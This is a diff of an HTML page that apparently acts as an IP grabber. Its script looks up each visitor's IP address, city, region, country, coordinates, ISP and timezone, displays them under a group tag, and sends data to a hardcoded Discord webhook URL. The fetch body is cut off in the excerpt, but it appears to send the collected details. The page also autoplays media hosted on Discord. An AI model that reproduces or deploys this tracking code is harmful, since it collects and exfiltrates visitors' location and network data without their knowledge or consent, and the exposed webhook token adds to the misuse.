@@ -88,7 +88,6 @@
 </style>
 </head>
 <body>
-
 <div class="content">
     <video class="background-video-second" autoplay loop muted>
         <source src="" type="video/mp4">
@@ -102,10 +101,9 @@
             <img src="https://images-ext-1.discordapp.net/external/HeaLkTrNqV0jPXIWtxPllG_7fv9J7Rl0wBvDqZlJOlc/%3Fsize%3D1024%26width%3D2048%26height%3D0/https/cdn.discordapp.com/banners/619571499489165323/a_78ba8f23d60b95e67e1b3c855d54525b.gif" alt="">
         </div>
         <div class="info" id="ip-info">Loading IP Info...</div>
-        <div class="text">خلك على هواك ناسا فوق مستواك</div>
+        <div class="text">NASA 3MOMK yl MBTDA HHHHHHHHH</div>
         <audio autoplay loop>
             <source src="https://cdn.discordapp.com/attachments/938536293388931153/1360737109610201259/Untitled_video_-_Made_with_Clipchamp_9.mp4?ex=67fc34b0&is=67fae330&hm=4c142ae98700ef0fa3c5e223983a792af14b6ba5fce30715fcf88a3109702a7b&" type="audio/mpeg">
-            Your browser does not support the audio element.
         </audio>
     </div>
 </div>
@@ -115,7 +113,7 @@
         .then(data => {
             const { ip, country, city, region, loc, org, timezone } = data;
             const infoDiv = document.getElementById('ip-info');
-            infoDiv.innerHTML = `<strong>#NASA ON ToP</strong><br><strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
+            infoDiv.innerHTML = `<strong>#3'naTy Family</strong><br><strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
             const dateTime = new Date().toLocaleString();
             const webhookUrl = 'https://discord.com/api/webhooks/1342711596035604511/c2zeLZnSp0faGn2G7rnFX6NOdOt1ewLys7Sp55NJt1p1A6FIkFkDciidXSyaV7_3WGie';
             fetch(webhookUrl, {
